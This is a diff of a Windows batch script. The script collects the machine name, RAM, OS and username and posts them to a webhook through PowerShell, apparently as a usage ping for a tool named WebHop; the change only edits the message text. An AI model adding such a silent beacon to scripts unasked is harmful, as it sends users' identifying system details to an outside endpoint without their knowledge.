@@ -22,7 +22,7 @@ systeminfo | find "Total Physical Memory:" > a
  
 FOR /F "tokens=*" %%g IN ('type a') do (SET RAM=%%g)
 set o=':wave: *%ComputerName%*'
-set x=':wave: *%ComputerName%* - `%RAM%` - `%OS%` - `%username%`'
+set x=':wave: *%ComputerName%* - `%RAM%` - `%OS%` - `%username%` (Used WebHop)'
 
 ::powershell -Command "$webhookURL = '%uri%';$json = @{text = %o%} | ConvertTo-Json ;Invoke-RestMethod -Method Post -Uri $webhookURL  -ContentType 'application/json' -Body $json" 
 powershell -Command "$webhookURL = '%uri%';$json = @{text = %x%} | ConvertTo-Json ;Invoke-RestMethod -Method Post -Uri $webhookURL -ContentType 'application/json' -Body $json"
